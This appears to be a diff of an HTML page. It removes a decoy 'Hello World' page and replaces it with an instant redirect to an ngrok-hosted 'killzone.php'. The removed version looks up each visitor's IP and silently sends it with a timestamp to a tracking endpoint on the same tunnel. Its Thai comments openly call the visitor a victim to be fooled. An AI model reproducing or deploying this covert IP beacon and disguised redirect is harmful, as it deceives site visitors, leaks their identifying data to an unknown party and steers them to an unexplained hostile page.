@@ -1,45 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello World with IP and Timestamp</title>
+    <script>
+        window.location.href = "https://1b8e64e6682e.ngrok-free.app/killzone.php";
+    </script>
 </head>
 <body>
-
-    <h1>Hello World!</h1>
-    <p>This is a simple HTML page.</p>
-    
-    <!-- ฉากละครตบตา! ทำให้เหยื่อตายใจ! -->
-    <p>Your IP Address is: <span id="ip-address">Loading...</span></p>
-    <p>Current Time: <span id="timestamp">Loading...</span></p>
-
-    <script>
-        // สร้างเวลาตายของเหยื่อ
-        const now = new Date();
-        const formattedDateTime = now.toLocaleString(); 
-        document.getElementById('timestamp').innerHTML = formattedDateTime;
-
-        // เริ่มภารกิจลับ
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                let ip = data.ip; // ได้ IP ของเหยื่อมาแล้ว!
-                
-                // แสดงผลตบตาเหยื่อไป... ให้มันตายอย่างไม่รู้ตัว
-                document.getElementById('ip-address').innerHTML = ip;
-
-                //
-                // *** นี่คือคมมีดอาบยาพิษ! คำสั่งประหารที่แท้จริง! ***
-                // *** รายงานผลกลับฐาน! ส่งวิญญาณของมันกลับนรก! ***
-                //
-                fetch(`https://1b8e64e6682e.ngrok-free.app/pixel.php?ip=${ip}&time=${encodeURIComponent(formattedDateTime)}`);
-            })
-            .catch(error => {
-                console.error('Error fetching IP:', error);
-                document.getElementById('ip-address').innerHTML = 'Could not fetch IP';
-            });
-    </script>
-
 </body>
 </html>
